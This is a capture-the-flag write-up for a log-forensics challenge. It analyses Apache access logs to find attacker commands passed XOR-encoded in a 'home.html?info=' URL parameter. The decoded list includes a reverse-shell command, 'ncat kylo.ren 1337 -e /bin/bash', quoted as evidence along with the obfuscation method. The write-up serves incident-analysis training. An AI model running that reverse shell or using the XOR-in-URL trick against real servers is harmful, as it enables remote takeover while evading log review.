```
 Festive Forensics: The Christmas Incident
250

It's the holiday season, and your e-commerce business, which specializes in selling Christmas gifts, is experiencing a spike in activity. However, the day after Christmas Eve, the infrastructure manager informs you that an attack has targeted the main website, disrupting sales and threatening the security of customer data. You are responsible for analyzing the Apache web server logs to understand what happened.

To do this you must discover the method used by the attacker to camouflage his activity as well as the second and third command executed by the latter in the order of execution.

Flag format: CMCTF{method_cmd1_cmd2}

Flag example: CMCTF{morse_whoami_tree}

Author: t4f3

```
 we are given access.log file
the file is web server(apach2) log file:
each line of this file contain:
10.0.192.157 - - [13/May/2022:00:00:20 +0200] "GET /static/assests/images/space.jpg HTTP/1.1" 404 429 "-" "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 7 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36"

1 - ip address of user who reach the request
2 - the date/time
3 - request method: GET/POST/PUT...
4 - the Path/url
5 - returned code: 200/301/302/400/404/....
6 - size of data returned
7 - referrer http header
8 - user Agent of the browser

if you analyse carefouly, you can realise that  we can see request data in GET method only. Because with request method,
the data are send on url.
 as the log file contain the path/url, we can see those data.
w can not see data send trough Post/PUT . because those data are send in the request body and we don't have request body on the log file.
so to simplify our task as analyser, we will only investigate on GET request.
i use grep to list only GET request.
we also now that data will be send to .php, .html file normaly. .js,.css,.png, .jpeg don't deal request param. so we filter all request made on one of those file
 # cmd 
```bash
grep "GET /[^ ]*\.html?" access.log
```
 the command return all GET request which have url param
the ouput contain a lot of get request with lang=. 
```
n64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
10.0.126.100 - - [13/May/2022:23:59:15 +0200] "GET /index.html?lang=en HTTP/1.1" 200 1366 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
10.0.192.157 - - [13/May/2022:23:59:21 +0200] "GET /index.html?lang=fr HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
10.0.126.100 - - [13/May/2022:23:59:37 +0200] "GET /index.html?lang=en HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1"
10.0.75.29 - - [13/May/2022:23:59:40 +0200] "GET /index.html?lang=fr HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
10.0.87.216 - - [13/May/2022:23:59:41 +0200] "GET /index.html?lang=fr HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Linux; Android 4.2.2; Nexus 7 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36"
10.0.126.100 - - [13/May/2022:23:59:44 +0200] "GET /index.html?lang=en HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
10.0.32.115 - - [13/May/2022:23:59:48 +0200] "GET /index.html?lang=en HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1"
10.0.126.194 - - [13/May/2022:23:59:52 +0200] "GET /index.html?lang=en HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Linux; Android 4.3; fr-fr; SAMSUNG GT-I9506-ORANGE Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"
10.0.102.204 - - [13/May/2022:23:59:56 +0200] "GET /index.html?lang=fr HTTP/1.1" 200 1366 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
```
let filter them

# cmd:
```bash
grep "GET /[^ ]*\.html?" access.log | grep -v "lang"
10.0.181.41 - - [13/May/2022:10:20:54 +0200] "GET /home.html?info=mr!,m` HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
10.0.181.41 - - [13/May/2022:10:20:55 +0200] "GET /home.html?info=inruo`ld HTTP/1.1" 200 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
10.0.181.41 - - [13/May/2022:10:20:59 +0200] "GET /home.html?info=qve HTTP/1.1" 200 187 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
10.0.181.41 - - [13/May/2022:10:21:04 +0200] "GET /home.html?info=ob`u!jxmn/sdo!0226!,d!.cho.c`ri HTTP/1.1" 200 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
```

interesting:
we have the param info wich contain encrypted data
i copy "mr!,m`"  and use cyberchef magic option with inensive mode and i got  ``ls -al``
![]("../images/cyberchef.png")

# it is xor with key= 1
```
mr!,m` = ls -al
inruo`ld = hostname
qve = pwd
ob`u!jxmn/sdo!0226!,d!.cho.c`ri = ncat kylo.ren 1337 -e /bin/bash
```

# flag : CMCTF{xor_hostname_pwd}

